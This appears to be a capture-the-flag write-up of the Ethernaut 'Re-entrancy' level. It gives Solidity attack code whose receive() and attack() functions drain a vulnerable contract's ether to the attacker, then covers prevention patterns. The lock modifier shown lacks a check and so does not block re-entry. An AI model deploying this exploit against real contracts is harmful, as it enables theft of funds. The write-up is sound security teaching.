# 10) Re-entrancy

Success condition:
> The goal of this level is for you to steal all the funds from the contract.

Simply enough. Based on the Name of the level, we will have to use a re-entrancy attack to steal the funds. We can see that this line `msg.sender.call{value: _amount}("")` in the withdraw function will send ehter to the `msg.sender`. If the `msg.sender` is a contract, this will call the `receive()` function. We can thus choose to execute any code we want within this function. This is how we will attack this contract.

Our `receive()` function is like this:

```
receive() external payable {
    uint256 balanceTotal = victim.balance; // find out how much ether is in the contract
    if (balanceTotal > 0) {
        Reentrance(victim).withdraw(balanceTotal); // withdraw all of it
    }
    owner.transfer(address(this).balance);  // send the ether to the attacker address (whoever deploy the attack contract)
}

```

By looking at the `withdraw()` function we can see that we need to satisfy this condition `(balances[msg.sender] >= _amount)` to execute the `msg.sender.call()`. So we first need to donate some ether to increase our balance in the contract. By sending the same amount of ether that is on the contract, We will be able to drain all funds by calling the `withdraw()` function:

```
function attack() public {
    uint256 balanceTotal = victim.balance;  //get the amount of ether on the contract
    Reentrance(victim).donate{value: balanceTotal, gas: 1000000}( //send that much ether.  (need to add more gaz)
        address(this)
    );
    Reentrance(victim).withdraw(balanceTotal);  // withdraw the same amount
}

```
Here's what happens during our attack in the Reentrance::withdraw function:
```
   function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {  // 1. condition passed since withdraw what we sent
            (bool result, ) = msg.sender.call{value: _amount}("");  // 2. we get our money back plus run our receive() function which run 1. and 2. again
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

```




---
### Re-entrancy attack

A contract during its normal execution may perform calls to other contracts, by doing function calls or simply transferring Ether. These contracts can themselves call other contracts. In particular, they can call back to the contract that called them, or any other in the call stack. In that case, we say that the contract is re-entered, and this situation is known as reentrancy.



### How to prevent the attack
To avoid a Re-entrancy attack, it is good to use a Check-effect-interaction pattern, where you first reduce the balance of the user before sending him his money for exemple. You can also use a lock on the function such as a locking modifier:
```
modifier lock() {
        locked = true;
        _;
        locked = false;
    }
```

### call() instead of transfer and send
```
contract Vulnerable {
    function withdraw(uint256 amount) external {
        // This forwards 2300 gas, which may not be enough if the recipient
        // is a contract and gas costs change.
        msg.sender.transfer(amount);
    }
}

contract Fixed {
    function withdraw(uint256 amount) external {
        // This forwards all available gas. Be sure to check the return value!
        (bool success, ) = msg.sender.call.value(amount)("");
        require(success, "Transfer failed.");
    }
}
```

---
## Level completed!

In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/), [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

 

The DAO Hack
The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See 15 lines of code that could have prevented TheDAO Hack.

 